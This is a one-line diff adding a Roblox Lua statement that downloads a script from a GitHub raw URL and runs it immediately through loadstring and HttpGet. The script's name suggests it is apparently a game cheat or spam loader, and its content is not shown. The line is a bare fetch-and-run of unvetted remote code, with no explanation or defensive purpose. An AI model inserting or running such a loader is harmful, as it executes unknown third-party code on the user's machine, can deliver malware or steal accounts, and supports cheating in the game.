@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/run-a-sari-sari-store-spam7-h31y88j2m6qwjd.lua"))()
